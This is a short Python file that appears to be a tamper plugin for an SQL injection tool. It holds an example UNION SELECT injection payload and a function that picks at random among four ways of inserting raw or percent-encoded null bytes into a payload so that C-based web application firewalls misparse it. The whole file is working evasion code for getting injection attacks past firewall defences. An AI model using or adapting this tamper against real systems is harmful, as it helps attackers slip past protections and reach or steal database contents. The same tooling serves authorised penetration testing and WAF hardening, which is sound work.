import random

__example_payload__ = "' UNION SELECT NULL--"
__type__ = "NULL byte fragmentation: injects null bytes between characters to break C-based WAF parsing"


def tamper(payload, **kwargs):
    if not payload:
        return payload

    strategies = [
        # NULL byte between every char
        lambda s: '\x00'.join(list(s)),
        # NULL byte between words only
        lambda s: s.replace(' ', '\x00 \x00'),
        # Random NULL bytes at keyword boundaries
        lambda s: s.replace('SELECT', 'SEL\x00ECT').replace('UNION', 'UN\x00ION').replace('NULL', 'NU\x00LL'),
        # Percent-encoded null bytes
        lambda s: s.replace(' ', '%00 %00'),
    ]

    strategy = random.choice(strategies)
    return strategy(payload)
